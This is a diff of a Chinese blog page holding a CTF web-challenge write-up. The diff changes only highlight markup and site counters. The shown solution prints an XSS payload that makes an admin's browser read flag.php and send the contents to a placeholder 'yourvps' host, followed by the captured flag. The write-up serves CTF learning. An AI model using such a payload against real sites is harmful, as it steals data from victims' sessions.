@@ -429,7 +429,7 @@
 <h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>没有csp头。但没办法直接得到cookie。</p>
 <p>另外有一个flag.php，访问后如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">only admin can see the flag!</div></pre></td></tr></table></figure></p>
 <p>我们先控制admin访问flag.php，之后再发送数据到我们vps上。</p>
-<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
+<p>payload：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">  xhr.open(<span class="string">"GET"</span>, <span class="string">"http://202.112.51.217:43425/flag.php"</span>, <span class="literal">false</span>);</div><div class="line">  xhr.send();</div><div class="line">  a=xhr.responseText;</div><div class="line">  location.href=<span class="string">"http://yourvps/?a="</span>+<span class="built_in">escape</span>(a);</div><div class="line"><span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure></p>
 <p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170822/12.png?raw=true" alt=""></p>
 <p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xman&#123;OH_Y0u_G37_mY_secreT_F14G!&#125;</div></pre></td></tr></table></figure></p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这些夏令营的题目是看到了一份wp，然后直接用nmap把ip的所有端口都扫了一遍：），然后扫出了一些web题：）</p>
@@ -604,7 +604,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">139</span>
+                <span class="site-state-item-count">140</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -622,7 +622,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">60</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
